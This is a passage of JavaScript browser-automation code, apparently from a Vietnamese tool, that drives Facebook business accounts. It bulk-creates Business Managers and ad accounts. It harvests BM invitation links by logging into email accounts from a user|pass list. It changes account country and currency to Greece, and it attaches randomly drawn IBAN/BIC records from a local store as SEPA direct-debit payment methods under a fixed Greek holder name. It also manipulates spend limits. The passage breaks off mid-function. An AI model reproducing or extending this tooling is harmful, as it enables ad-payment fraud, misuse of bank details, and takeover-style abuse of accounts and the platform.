                                                        for (let index = 0; index < 5; index++) {

                                                            try { process.kill(browser.process().pid, 0)} catch { break }
                                                            
                                                            try {
                                                                await fbPage.switchToMain()
                                                                switchToMainSuccess = true
                                                                break
                                                            } catch {}

                                                            await page.waitForTimeout(1000)

                                                        }

                                                        if (!switchToMainSuccess) {

                                                            send('message', {id: item.id, message: 'Không thể chuyển về profile chính'})

                                                            break

                                                        }

                                                    }

                                                    await page.waitForTimeout(3000)
                                                }



                                                wa.update(whatsApp.id, {running: false})
                                            }
                                
                                        } else {

                                            for (let index = 0; index < number; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }
                                                
                                                try {

                                                    // if (client) {
                                                    //     const fbPage = new Page(page, item, data.fb_dtsg, data.accessToken, data.lsd)
                                                    //     const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)

                                                    //     const pageName = await fbPage.createPageWhatsApp(setting.bmName.value, client, msg => {
                                                    //         send('message', {id: item.id, message: msg})
                                                    //     })

                                                    //     const bm = await account.getBm()

                                                    //     const successBm = bm.filter(item => item.name === pageName)

                                                    //     if (successBm[0]) {

                                                    //         send('message', {id: item.id, message: 'Tạo BM Whatsapp thành công'})
                                                    //         createBmSuccess++
                                                    //     }

                                                    // } else {

                                                    //     wa.update(whatsApp.id, {active: false})

                                                    //     send('message', {id: item.id, message: 'Không thể đăng nhập tài khoản Whatsapp'})
                                                    //     break
                                                    // }

                                                    await account.createBm(type, setting.bmName.value)

                                                    createBmSuccess++

                                                } catch {}

                                                await page.waitForTimeout(2000)

                                            }

                                            send('message', {id: item.id, message: 'Đã tạo thành công '+createBmSuccess+'/'+number+' BM'})

                                        }
                                                
                                    }

                                    if (setting.createAdAccount.value) {
                                        try {

                                            send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                            let listBm = []

                                            if (setting.createAdAccountMode.value === 'all') {

                                                listBm = (await account.getBmStatus()).filter(item => item.type === setting.createAdAccountType.value)

                                            }

                                            if (setting.createAdAccountMode.value === '350') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === setting.createAdAccountType.value && bmData.sharing_eligibility_status === 'enabled'
                                                })

                                            }

                                            if (setting.createAdAccountMode.value === '50') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === setting.createAdAccountType.value && bmData.sharing_eligibility_status === 'disabled_due_to_trust_tier'
                                                })

                                            }

                                            if (setting.createAdAccountMode.value === 'nolimit') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === setting.createAdAccountType.value && bmData.sharing_eligibility_status !== 'disabled_due_to_trust_tier' && bmData.sharing_eligibility_status !== 'enabled'
                                                })

                                            }


                                            if (setting.createAdAccountMode.value === 'id') {

                                                const bmStatus = await account.getBmStatus()
                                                let listId = []

                                                if (setting.listId.value.includes(',')) {
                                                    listId = setting.createAdAccountListId.value.split(',').filter(item => item).map(item => item.trim())
                                                } else {
                                                    listId = setting.createAdAccountListId.value.split(/\r?\n|\r|\n/g).filter(item => item).map(item => item.trim())
                                                }

                                                listBm = listId.filter(item => item).map(item => {
                                                    return (bmStatus.filter(bm => bm.id === item.trim() && bm.type === setting.createAdAccountType.value))[0]
                                                }).filter(item => item)

                                            }
                                            
                                            if (listBm.length > 0) {

                                                let createAccountSuccess = 0

                                                send('message', {id: item.id, message: 'Đang tạo TKQC'})

                                                for (let index = 0; index < listBm.length; index++) {

                                                    try { process.kill(browser.process().pid, 0)} catch { break }

                                                    const bm = listBm[index]
                                                    
                                                    try {

                                                        await account.createAdAccount(bm.id, setting.tkqcCurency.value, setting.tkqcTimezone.value, setting.nameTkqc.value)

                                                        createAccountSuccess++

                                                    } catch (err) {
                                                        log(err)
                                                    }

                                                    send('message', {id: item.id, message: 'Đã tạo thành công '+createAccountSuccess+'/'+listBm.length+' TKQC'})
                                                }


                                            } else {
                                                send('message', {id: item.id, message: 'Không có BM'})
                                            }

                                        } catch (err) {
                                            log(err)
                                            send('message', {id: item.id, message: 'Không thể lấy thông tin BM'})
                                        }
                                    }

                                    if (setting.renameBm.value) {
                                        
                                        try {

                                            send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                            let listBm = []

                                            if (setting.renameBmMode.value === 'all') {

                                                listBm = (await account.getBmStatus()).filter(item => item.type === setting.renameBmType.value)

                                            }

                                            if (setting.renameBmMode.value === '350') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === setting.renameBmType.value && bmData.sharing_eligibility_status === 'enabled'
                                                })

                                            }

                                            if (setting.renameBmMode.value === '50') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === setting.renameBmType.value && bmData.sharing_eligibility_status === 'disabled_due_to_trust_tier'
                                                })

                                            }

                                            if (setting.renameBmMode.value === 'nolimit') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bm.type === setting.renameBmType.value && bmData.sharing_eligibility_status !== 'disabled_due_to_trust_tier' && bmData.sharing_eligibility_status !== 'enabled'
                                                })

                                            }


                                            if (setting.renameBmMode.value === 'id') {

                                                const bmStatus = await account.getBmStatus()
                                                let listId = []

                                                if (setting.listId.value.includes(',')) {
                                                    listId = setting.renameBmListId.value.split(',').filter(item => item).map(item => item.trim())
                                                } else {
                                                    listId = setting.renameBmListId.value.split(/\r?\n|\r|\n/g).filter(item => item).map(item => item.trim())
                                                }

                                                listBm = listId.filter(item => item).map(item => {
                                                    return (bmStatus.filter(bm => bm.id === item.trim() && bm.type === setting.renameBmType.value))[0]
                                                }).filter(item => item)

                                            }


                                            const z = new zFetch(page)

                                            const res = await z.get('https://graph.facebook.com/v15.0/me/businesses?fields=sharing_eligibility_status,allow_page_management_in_www,owned_ad_accounts.limit(1)%7Baccount_status,currency%7D&limit=99999&access_token='+accessToken)
                                            const data = res.data

                                            if (setting.bmTkqc.value === 'co' || setting.bmTkqc.value === 'co_live' || setting.bmTkqc.value === 'co_die') {

                                                listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && item.owned_ad_accounts)[0])

                                                if (setting.bmTkqc.value === 'co_live') {
                                                    
                                                    listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && item.owned_ad_accounts.data.filter(item => item.account_status === 1)[0])[0])

                                                }

                                                if (setting.bmTkqc.value === 'co_die') {
                                                    
                                                    listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && item.owned_ad_accounts.data.filter(item => item.account_status === 2)[0])[0])

                                                }
                                            }

                                            if (setting.bmTkqc.value === 'kco') {

                                                listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && !item.owned_ad_accounts)[0])
                                            }
                                            
                                        
                                            if (listBm.length > 0) {

                                                let renameBmSuccess = 0

                                                send('message', {id: item.id, message: 'Đang đổi tên BM'})

                                                for (let index = 0; index < listBm.length; index++) {

                                                    try { process.kill(browser.process().pid, 0)} catch { break }

                                                    const bm = listBm[index]
                                                    
                                                    try {

                                                        await account.renameBm(bm.id, setting.newNameBm.value)

                                                        renameBmSuccess++

                                                    } catch (err) {
                                                        log(err)
                                                    }

                                                    send('message', {id: item.id, message: 'Đã đổi tên thành công '+renameBmSuccess+'/'+listBm.length+' BM'})
                                                }

                                            } else {
                                                send('message', {id: item.id, message: 'Không có BM'})
                                            }

                                        } catch (err) {
                                            log(err)
                                            send('message', {id: item.id, message: 'Không thể lấy thông tin BM'})
                                        }
                                    }

                                    if (setting.backupBm.value) {
                                        
                                        try {

                                            send('message', {id: item.id, message: 'Đang lấy thông tin BM'})

                                            let listBm = []

                                            if (setting.backupBmMode.value === 'all') {

                                                listBm = (await account.getBmStatus())

                                            }

                                            if (setting.backupBmMode.value === '350') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bmData.sharing_eligibility_status === 'enabled'
                                                })

                                            }

                                            if (setting.backupBmMode.value === '50') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bmData.sharing_eligibility_status === 'disabled_due_to_trust_tier'
                                                })

                                            }

                                            if (setting.backupBmMode.value === 'nolimit') {

                                                const accBm = await account.getBm()

                                                listBm = (await account.getBmStatus()).filter(bm => {

                                                    const bmData = (accBm.filter(item => item.id === bm.id))[0]

                                                    return bmData.sharing_eligibility_status !== 'disabled_due_to_trust_tier' && bmData.sharing_eligibility_status !== 'enabled'
                                                })

                                            }


                                            if (setting.backupBmMode.value === 'id') {

                                                const bmStatus = await account.getBmStatus()
                                                let listId = []

                                                if (setting.listId.value.includes(',')) {
                                                    listId = setting.backupBmListId.value.split(',').filter(item => item).map(item => item.trim())
                                                } else {
                                                    listId = setting.backupBmListId.value.split(/\r?\n|\r|\n/g).filter(item => item).map(item => item.trim())
                                                }

                                                listBm = listId.filter(item => item).map(item => {
                                                    return (bmStatus.filter(bm => bm.id === item.trim()))[0]
                                                }).filter(item => item)

                                            }


                                            const z = new zFetch(page)

                                            const res = await z.get('https://graph.facebook.com/v15.0/me/businesses?fields=sharing_eligibility_status,allow_page_management_in_www,owned_ad_accounts.limit(1)%7Baccount_status,currency%7D&limit=99999&access_token='+accessToken)
                                            const data = res.data

                                            if (setting.backupBmTkqc.value === 'co' || setting.backupBmTkqc.value === 'co_live' || setting.backupBmTkqc.value === 'co_die') {

                                                listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && item.owned_ad_accounts)[0])

                                                if (setting.backupBmTkqc.value === 'co_live') {
                                                    
                                                    listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && item.owned_ad_accounts.data.filter(item => item.account_status === 1)[0])[0])

                                                }

                                                if (setting.backupBmTkqc.value === 'co_die') {
                                                    
                                                    listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && item.owned_ad_accounts.data.filter(item => item.account_status === 2)[0])[0])

                                                }
                                            }

                                            if (setting.backupBmTkqc.value === 'kco') {

                                                listBm = listBm.filter(bm => data.filter(item =>  item.id === bm.id && !item.owned_ad_accounts)[0])
                                            }
                                            
                                            if (setting.backupBmType.value !== 'ALL') {

                                                const bmStatus = await account.getBmStatus()

                                                listBm = listBm.filter(bm => {
                                                    const bmData = bmStatus.filter(item => item.id === bm.id)[0]

                                                    return bmData.type === setting.backupBmType.value
                                                })

                                            }
                                        
                                            if (listBm.length > 0) {

                                                let backupBmSuccess = 0

                                                send('message', {id: item.id, message: 'Đang backup BM'})

                                                listBm = listBm.slice(0, setting.bmLimit.value)

                                                for (let index = 0; index < listBm.length; index++) {

                                                    try { process.kill(browser.process().pid, 0)} catch { break }

                                                    const bm = listBm[index]
                                                    
                                                    try {

                                                        await account.backupBm(bm.id, item.backupEmail, setting.linkLimit.value, setting.backupBmRole.value, setting.backupBmDelay.value)

                                                        backupBmSuccess++

                                                    } catch (err) {
                                                        log(err)
                                                    }

                                                    send('message', {id: item.id, message: 'Đã backup thành công '+backupBmSuccess+'/'+listBm.length+' BM'})
                                                }

                                            } else {
                                                send('message', {id: item.id, message: 'Không có BM'})
                                            }

                                        } catch (err) {
                                            log(err)
                                            send('message', {id: item.id, message: 'Không thể lấy thông tin BM'})
                                        }
                                    }

                                    if (setting.createPageBm.value) {

                                        send('message', {id: item.id, message: 'Đang tạo Page'})

                                        try {

                                            const name = setting.pageNameBm.value || 'Toolfb'

                                            const pageId = await account.createPage(name)

                                            send('message', {id: item.id, message: 'Tạo thành công Page: '+pageId})
                                            
                                            await page.waitForTimeout(3000)

                                            send('message', {id: item.id, message: 'Đang thêm Page vào BM'})

                                            try {

                                                send('message', {id: item.id, message: 'Đang thêm Page vào BM'})

                                                await account.applyPage(pageId)

                                                send('message', {id: item.id, message: 'Thêm Page vào BM thành công'})

                                            } catch {
                                                send('message', {id: item.id, message: 'Không thể thêm Page vào BM'})
                                            }

                                        } catch (err) {
                                            send('message', {id: item.id, message: 'Tạo Page thất bại'})
                                        }

                                    }

                                    if (setting.getLinkBm.value) {

                                        const file = path.resolve(app.getPath('userData'), './backup/link.json')
                                        const emailFile = path.resolve(app.getPath('userData'), './backup/email.json')
                                        const number = setting.getLinkBmNumber.value
                                        const delay = setting.getLinkBmDelay.value
                                        const mode = setting.getLinkReadMode.value
                                        const z = new zFetch(page)

                                        let acceptSuccess = 0

                                        for (let index = 0; index < number; index++) {

                                            try { process.kill(browser.process().pid, 0)} catch { break }
                                            
                                            let link = ''

                                            for (let index = 0; index < 99999; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                try {

                                                    const allLink = JSON.parse(await fs.promises.readFile(file, {encoding: 'utf-8'}))
                                                    

                                                    if (allLink[0]) {

                                                        link = allLink[0]
                                                        const finalLink = allLink.filter(item => item !== link)
                                                        await fs.promises.writeFile(file, JSON.stringify(finalLink))
                                                        send('updateLinkAll', finalLink)

                                                        break

                                                    } else {
                                                        throw Error()
                                                    }

                                                } catch (err) {

                                                    if (mode === 'auto') {

                                                        send('message', {id: item.id, message: 'Đang lấy link mới'})

                                                        const limit = promiseLimit(100)

                                                        const getLink = (user, pass, mode) => {

                                                            return new Promise(async (resolve, reject) => {

                                                                let result = []
                                                                
                                                                try {

                                                                    result = await getBackupLink(user, pass, mode)

                                                                    resolve(result)

                                                                } catch {
                                                                    resolve(result)
                                                                }
                                                            })
                                                        }

                                                        try {

                                                            const email = JSON.parse(await fs.promises.readFile(emailFile), {encoding: 'utf-8'})

                                                            if (email.length === 0) {

                                                                break

                                                            } else {

                                                                let result = []

                                                                try {

                                                                    result = await Promise.all(email.map((item) => {

                                                                        const emailData = item.split('|')
                                                                        const user = emailData[0]
                                                                        const pass = emailData[1]

                                                                        return limit(() => getLink(user, pass, 'unseen'))
                                                                    }))

                                                                } catch (err) {}

                                                                const newData = []

                                                                result.forEach(item => {
                                                                    item.forEach(link => {
                                                                        if (link) {
                                                                            newData.push(link)
                                                                        }
                                                                    })
                                                                })

                                                                if (newData.length > 0) { 
                                                                    await fs.promises.writeFile(file, JSON.stringify(newData))
                                                                }

                                                            }

                                                        } catch {}

                                                    } else {
                                                        break
                                                    }
                                                }

                                                await page.waitForTimeout(5000)
                                                
                                            }

                                            if (link) {

                                                const id = link.split('|')[0]
                                                const acpLInk = link.split('|')[1]

                                                send('message', {id: item.id, message: 'Đang tiến hành nhận link: '+acpLInk})

                                                try {

                                                    const url = await z.getRedirect(acpLInk)

                                                    if (url.includes('https://business.facebook.com/invitation/?token=')) {

                                                        const params = new URL(url).searchParams

                                                        const token = params.get('token')

                                                        const res = await z.post("https://business.facebook.com/business/invitation/login/", {
                                                            "headers": {
                                                                "content-type": "application/x-www-form-urlencoded",
                                                            },
                                                            "body": "first_name=Toolfb&last_name="+randomNumber(11111, 99999)+"&invitation_token="+token+"&receive_marketing_messages=false&user_preferred_business_email&__user="+item.uid+"&__a=1&__req=2&__hs=19664.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=GOOD&__rev=1009675755&__s=voml6w%3Aorwnqa%3A3cyaaa&__hsi=7297248857485608221&__dyn=7xeUmwkHgydwn8K2WnFwn84a2i5U4e1Fx-ewSwMxW0DUS2S0lW4o3Bw5VCwjE3awbG78b87C1xwEwlU-0nS4o5-1uwbe2l0Fwwwi85W0_Ugw9KfwbK0RE5a1qwqU8E5W0HUvw5rwSxy0gq0Lo6-1FwbO0NE1rE&__csr=&fb_dtsg="+data.fb_dtsg+"&jazoest=25503&lsd=VjWEsSvVwDyPvLUmreGFgG&__spin_r=1009675755&__spin_b=trunk&__spin_t=1699023148&__jssesw=1",
                                                        })

                                                        if (!res.includes('errorDescription')) {

                                                            acceptSuccess++

                                                            send('updateLinkSuccess', link)

                                                        } else {

                                                            send('updateLinkError', link)

                                                        }

                                                    }

                                                } catch (err) {
                                                    log(err)
                                                }
                                                
                                            }


                                            await page.waitForTimeout(delay * 100)
                                            
                                        }

                                        send('message', {id: item.id, message: 'Đã nhận thành công '+acceptSuccess+' link'})

                                    }

                                } else {
                                    send('message', {id: item.id, message: 'Không thể lấy Access Token'})
                                }

                            }

                            if (mode === 'normal' && tool === 'tut' && !error) {

                                const tut = new Tut(page, data, setting, item, browser.process().pid)

                                if (setting.kich5m8.value) {

                                    if (setting.kich5m82.value) {

                                        const z = new zFetch(page)

                                        const html = await z.get('https://adsmanager.facebook.com/adsmanager/')
                                        const mainIdMatch = html.match(/(?<=act=)(.*)(?=&breakdown_regrouping)/g)
                                        const mainId = mainIdMatch[0]

                                        const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)

                                        const stats = await account.getAccountStats(mainId) 

                                        if (stats.limit != '-1') {
                                            
                                            await z.post("https://adsmanager.facebook.com/ads/ajax/account_close/?_flowletID=3407", {
                                                "headers": {
                                                    "content-type": "application/x-www-form-urlencoded",
                                                },
                                                "body": 'account_id='+mainId+'&__usid=6-Ts3t5rnzaxc68:Ps3t5y54msi5h:0-As3t5rndzivxo-RV=6:F=&__user='+item.uid+'&__a=1&__req=w&__hs=19669.BP:ads_campaign_manager_pkg.2.0..0.0&dpr=1&__ccg=UNKNOWN&__rev=1009765893&__s=ldyxkr:c21q89:vs626m&__hsi=7299092948090045902&__dyn=7xeUmxa2C5rgydwCxpxO9UqDBBBWqxu59o9E4a2i5aCGq58mCyEgx2226UjACzEdF98SmcBxWE-1qG4EOezobo-5FoS1kx2egGbwgEmK9y8Gdz8hyUdocEaEcEixWq3h0Bxq3m2S2qq1eCBBKfxJedQ2OmGx6ta2dmm3mbKegK26bwr8sxep3bBwyylhUeEjx63KdxG11xny-cwuEnxK1Nz84a9DxW48W222a3Fe6rwRwFDwFwBgakbAzE8UqyodoK78-3K5EbpEbororx2aK48hByV8y26U8U-UG2e1dx-q4VEhwwwSxm1fAwLzUS2W2K4E5yeDyU52dDxG3WcwMUS5aDBwAKm2WE4e8zUF1a58gx6bCyVUCcG2CmqaUK2e18xq1WDDwbm15zi1y4e1mAK2q13DzFHwCwNU9o4S7ErhEsxx7KA36q2au3Gez8aEky8&__csr=&fb_dtsg='+data.fb_dtsg+'&jazoest=25441&lsd=XqUUq-mORsLUqE2V5xQjYk&__aaid='+mainId+'&__spin_r=1009765893&__spin_b=trunk&__spin_t=1699452509',
                                            })

                                        }

                                    }

                                    try {
                                        await tut.kich5m8((action, data) => {
                                            send(action, data)
                                        })
                                    } catch (err) {
                                    log(err)
                                    }

                                }

                                if (setting.addCardCamp.value) {

                                    try {

                                        const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)
                                        const z = new zFetch(page)

                                        const adAccount = (await account.getAdAccounts()).filter(item => item.status === 1)

                                        let successCount = 0

                                        for (let index = 0; index < adAccount.length; index++) {

                                            try {

                                                let updateSuccess = false

                                                if (adAccount[index].timezoneName !== 'America/Dawson' || adAccount[index].currency !== 'EUR' || adAccount[index].countryCode !== 'GR') {

                                                    send('message', {id: item.id, message: 'Đang đổi thông tin'})

                                                    const res = await z.post("https://business.facebook.com/api/graphql/?_flowletID=6633&_triggerFlowletID=6633", {
                                                        "headers": {
                                                            "content-type": "application/x-www-form-urlencoded",
                                                        },
                                                        "body": "av="+item.uid+"&__usid=6-Ts9jsojm2rgkx%3APs9jsoiaadazw%3A0-As9jsny1e13sl7-RV%3D6%3AF%3D&__aaid="+adAccount[index].id+"&__user="+item.uid+"&__a=1&__req=1n&__hs=19781.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=GOOD&__rev=1011688366&__s=v3rj4g%3Am5s20o%3Adecnzy&__hsi=7340498996393242717&__dyn=7xeUmxa3-Q5E9EdoK2abBAjwIBwCwpUnCG6UtyEgwjojyUW3qiidBxa7GzU726US2Sfxq4U5i4824yoyaxG4o4B0l898885G0Eo9FE4Wqmm2Z17wJBGEpiwzlBwgrxK261UxO4VA48a8lwWxe4oeUa8465udw9-0CE4a4ouyUd85WUpwo-m2C2l0FggzE8U98451KfwXxq1-orx2ewyx6i8wxK2efK2i9wAx25U9F8W6888dUnwj8888US2W2K4Ef8rzEjxu16Cg2DxiaBwKwq8O13xC4oiyVV98OEdEGdwzweau1Hwiomwm8gU5qiU9E4KeyE9Eco9U6O6Uc8swn9UgxS1MwiEao&__csr=&fb_dtsg="+data.fb_dtsg+"&jazoest=25336&lsd=71XhID0pPIwIySB3VOsuhV&__spin_r=1011688366&__spin_b=trunk&__spin_t=1709093106&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BillingAccountInformationUtilsUpdateAccountMutation&variables=%7B%22input%22%3A%7B%22billable_account_payment_legacy_account_id%22%3A%22"+adAccount[index].id+"%22%2C%22currency%22%3A%22EUR%22%2C%22logging_data%22%3A%7B%22logging_counter%22%3A21%2C%22logging_id%22%3A%223456290460%22%7D%2C%22tax%22%3A%7B%22business_address%22%3A%7B%22city%22%3A%22%22%2C%22country_code%22%3A%22GR%22%2C%22state%22%3A%22%22%2C%22street1%22%3A%22%22%2C%22street2%22%3A%22%22%2C%22zip%22%3A%22%22%7D%2C%22business_name%22%3A%22%22%2C%22is_personal_use%22%3Afalse%2C%22second_tax_id%22%3A%22%22%2C%22tax_id%22%3A%22%22%2C%22tax_registration_status%22%3A%22%22%2C%22eu_vat_tax_country%22%3A%22EL%22%7D%2C%22timezone%22%3A%22America%2FDawson%22%2C%22upl_logging_data%22%3A%7B%22context%22%3A%22billingaccountinfo%22%2C%22entry_point%22%3A%22BILLING_HUB%22%2C%22external_flow_id%22%3A%22184346746%22%2C%22target_name%22%3A%22BillingAccountInformationUtilsUpdateAccountMutation%22%2C%22user_session_id%22%3A%22upl_1709093108426_1bf33838-fc49-415c-a561-5b364e5da2bd%22%2C%22wizard_config_name%22%3A%22COLLECT_ACCOUNT_INFO%22%2C%22wizard_name%22%3A%22COLLECT_ACCOUNT_INFO%22%2C%22wizard_screen_name%22%3A%22account_information_state_display%22%2C%22wizard_session_id%22%3A%22upl_wizard_1709093108427_03f9a195-a8f6-41c9-b1c3-ccd69347fa0d%22%7D%2C%22actor_id%22%3A%22"+item.uid+"%22%2C%22client_mutation_id%22%3A%225%22%7D%7D&server_timestamps=true&doc_id=7352690921456326",
                                                    })

                                                    if (res.includes('supported_countries')) {

                                                        send('message', {id: item.id, message: 'Đổi thông tin thành công'})

                                                        updateSuccess = true

                                                    } else {

                                                        send('message', {id: item.id, message: 'Đổi thông tin thất bại'})

                                                    }

                                                } else {
                                                    updateSuccess = true
                                                }

                                                if (updateSuccess) {

                                                    const checkIban = async () => {
                                                        const res = await z.post("https://business.facebook.com/api/graphql/?_flowletID=164", {
                                                            "headers": {
                                                                "content-type": "application/x-www-form-urlencoded",
                                                            },
                                                            "body": "av="+item.uid+"&__usid=6-Ts9jwf4sgm77j%3APs9jwg614gyuse%3A0-As9jvmrnst3uy-RV%3D6%3AF%3D&__aaid="+adAccount[index].id+"&__user="+item.uid+"&__a=1&__req=l&__hs=19781.BP%3ADEFAULT.2.0..0.0&dpr=1.5&__ccg=EXCELLENT&__rev=1011688366&__s=lg94s8%3Abj32r3%3Aglkp5j&__hsi=7340519973355266290&__dyn=7xeUmxa3-Q5E5ObxGubBAjxu59o9E6u5aCG6UtyEgwjojyUW3qiidBxa7GzU72czES2Sfxq4U5i48qwqoC4Uqx6bwZg5i2i221qwa62qq1eCBBxe6Q4u2SmGxBa2dm3KbKegbo7y78qgOUa8Bku3G4UhwXwEwgolUS0DU2qwgEhxWbAzE885WUpwo-m2C2l0Fz98W2e6EC11grzUeUmwJCwim6UgzEgx6mbAy88rwzzXwAyo98gxu2qiexy223u5U4O222edwKwHxa3O6UW4UnwhFA6E7WdxiaBwAyo462qcwzx-6ohxabDAAzawFz8GdwzwdGuu1HwiomwKzi1y4e1mAK2q1bzEG2q37wBwr8rDwExmWwOCwyDx27oKez8fUy1awFw&__csr=&fb_dtsg="+data.fb_dtsg+"&jazoest=25372&lsd=ew36x5hVt23Z6vG8Lte8w0&__spin_r=1011688366&__spin_b=trunk&__spin_t=1709097989&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BillingHubPaymentSettingsPaymentMethodsListQuery&variables=%7B%22paymentAccountID%22%3A%22"+adAccount[index].id+"%22%7D&server_timestamps=true&doc_id=7244496902306864",
                                                        })

                                                        if (res.includes('IBAN')) {
                                                            return true
                                                        } else {
                                                            return false
                                                        }
                                                    }

                                                    if (await checkIban()) {

                                                        send('message', {id: item.id, message: 'Add thẻ thành công'})

                                                    } else {

                                                        send('message', {id: item.id, message: 'Đang add thẻ'})

                                                        const iBan = new Db('iBan')

                                                        let card = false

                                                        try {

                                                            card = await iBan.findRandom(item => item)

                                                            await iBan.delete(card.id)

                                                        } catch {
                                                            send('message', {id: item.id, message: 'Hết thẻ'})
                                                        }

                                                        if (card) {
                                                            
                                                            const iban = card.id
                                                            const bic = card.bic
                                                            
                                                            await z.post("https://business.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F&_flowletID=5215&_triggerFlowletID=5215", {
                                                                "headers": {
                                                                    "content-type": "application/x-www-form-urlencoded",
                                                                },
                                                                "body": "av="+item.uid+"&payment_dev_cycle=prod&__usid=6-Ts9jtahf697oi%3APs9jtah7el3rl%3A0-As9jt9btkirbb-RV%3D6%3AF%3D&__aaid="+adAccount[index].id+"&__user="+item.uid+"&__a=1&__req=29&__hs=19781.BP%3ADEFAULT.2.0..0.0&dpr=1&__ccg=EXCELLENT&__rev=1011688366&__s=xog7t1%3Apygus1%3Aukok4y&__hsi=7340502394374094965&__dyn=7xeUmxa3-Q5E9EdoK2abBAjwIBwCwpUnCG6UtyEgwjojyUW3qiidBxa7GzU726US2Sfxq4U5i4824yoyaxG4o4B0l898885G0Eo9FE4Wqmm2Z17wJBGEpiwzlBwgrxK261UxO4VA48a8lwWxe4oeUa8465udw9-0CE4a4ouyUd85WUpwo-m2C2l0FggzE8U98451KfwXxq1-orx2ewyx6i8wxK2efK2i9wAx25U9F8W6888dUnwj8888US2W2K4Ef8rzEjxu16Cg2DxiaBwKwq8O13xC4oiyVV98OEdEGdwzweau1Hwiomwm8gU5qiU9E4KeyE9Eco9U6O6Uc8swn9UgxS1MwiEao&fb_dtsg="+data.fb_dtsg+"&jazoest=25737&lsd=D3Q6O9yIH0m4djHqvX55xf&__spin_r=1011688366&__spin_b=trunk&__spin_t=1709093897&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=useBillingDirectDebitSEPAMutation&variables=%7B%22input%22%3A%7B%22account_holder_name%22%3A%22%CE%99%CE%BF%CF%85%CE%BB%CE%B9%CE%B1%CE%BD%CF%8C%CF%82%20%CE%9F%CE%B9%CE%BA%CE%BF%CE%BD%CE%BF%CE%BC%CE%BF%CF%80%CE%BF%CF%8D%CE%BB%CE%BF%CF%85%22%2C%22account_number_last_four%22%3A%222987%22%2C%22approval%22%3Atrue%2C%22bank_account_number%22%3A%7B%22sensitive_string_value%22%3A%22"+iban+"%22%7D%2C%22bank_address%22%3A%7B%22city%22%3A%22Athens%22%2C%22country_code%22%3A%22GR%22%2C%22postal_code%22%3A%2210431%22%2C%22street_address%22%3A%22%CE%8C%CE%B4%CE%BF%CF%82%20%CE%92%CE%B1%CF%81%CE%B9%CE%BC%CF%80%CF%8C%CE%BC%CF%80%CE%B7%2C%20243%22%7D%2C%22bank_code%22%3A%22"+bic+"%22%2C%22geo_type%22%3A%22SEPA%22%2C%22logging_data%22%3A%7B%22logging_counter%22%3A36%2C%22logging_id%22%3A%22592565280%22%7D%2C%22payment_account_id%22%3A%22"+adAccount[index].id+"%22%2C%22upl_logging_data%22%3A%7B%22context%22%3A%22billingcreditcard%22%2C%22entry_point%22%3A%22BILLING_HUB%22%2C%22external_flow_id%22%3A%22%22%2C%22target_name%22%3A%22useBillingDirectDebitSEPAMutation%22%2C%22user_session_id%22%3A%22upl_1709093898883_cea729b5-5f63-4dc1-9b96-0fff507a157e%22%2C%22wizard_config_name%22%3A%22DIRECT_DEBIT%22%2C%22wizard_name%22%3A%22ADD_PM%22%2C%22wizard_screen_name%22%3A%22direct_debit_sepa_state_display%22%2C%22wizard_session_id%22%3A%22upl_wizard_1709093937526_68aab085-8ca7-451c-9690-911c30969071%22%7D%2C%22actor_id%22%3A%22"+item.uid+"%22%2C%22client_mutation_id%22%3A%2217%22%7D%7D&server_timestamps=true&doc_id=6569256129804548",
                                                            })

                                                            await page.waitForTimeout(5000)

                                                            if (await checkIban()) {

                                                                send('message', {id: item.id, message: 'Add thẻ thành công'})

                                                                successCount++

                                                            } else {
                                                                send('message', {id: item.id, message: 'Add thẻ thất bại'})
                                                            }

                                                        }

                                                    }
                                                }

                                            } catch (err) {
                                                console.log(err)
                                            }
                                                
                                        }

                                        send('message', {id: item.id, message: 'Add thẻ thành công: '+successCount+'/'+adAccount.length})

                                        lastMsg = 'Add thẻ thành công: '+successCount+'/'+adAccount.length

                                    } catch (err) {
                                        console.log(err)
                                    }

                                }

                                if (setting.checkPointPhone.value) {

                                    try {

                                        const z = new zFetch(page)

                                        const phone = setting.checkPointPhoneNumber.value

                                        send('message', {id: item.id, message: 'Đang thêm số điện thoại'})
                                        
